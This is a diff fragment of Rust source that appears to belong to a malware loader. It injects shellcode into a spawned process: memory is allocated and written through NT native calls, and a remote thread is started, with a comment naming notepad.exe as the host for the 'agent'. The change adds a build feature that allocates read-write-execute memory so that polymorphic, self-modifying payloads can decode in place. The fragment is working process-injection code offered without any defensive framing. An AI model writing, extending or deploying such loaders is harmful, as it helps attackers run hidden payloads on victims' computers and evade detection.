@@ -340,9 +340,15 @@ unsafe fn run() {
     let sc_len = sc.len();
     let mut addr: PVOID = ptr::null_mut();
     let mut sz: SIZE_T  = sc_len;
+    // raw_payload: poly/self-modifying stubs decode in-place — allocate RWX directly.
+    // staged: allocate RW, write, flip to RX.
+    #[cfg(feature = "raw_payload")]
+    let alloc_prot = PAGE_EXECUTE_READWRITE;
+    #[cfg(not(feature = "raw_payload"))]
+    let alloc_prot = PAGE_READWRITE;
     let status = NtAllocateVirtualMemory(
         pi.hProcess, &mut addr, 0, &mut sz,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
+        MEM_COMMIT | MEM_RESERVE, alloc_prot,
     );
     if status < 0 || addr.is_null() {
         CloseHandle(pi.hProcess);
@@ -353,8 +359,11 @@ unsafe fn run() {
     let mut wb: ULONG = 0;
     NtWriteVirtualMemory(pi.hProcess, addr, sc.as_ptr() as PVOID, sc_len as ULONG, &mut wb);
 
-    let mut old_prot: DWORD = 0;
-    NtProtectVirtualMemory(pi.hProcess, &mut addr, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);
+    #[cfg(not(feature = "raw_payload"))]
+    {
+        let mut old_prot: DWORD = 0;
+        NtProtectVirtualMemory(pi.hProcess, &mut addr, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);
+    }
 
     // 7. Spawn remote thread — agent runs independently in notepad.exe
     let mut h_thread: HANDLE = ptr::null_mut();
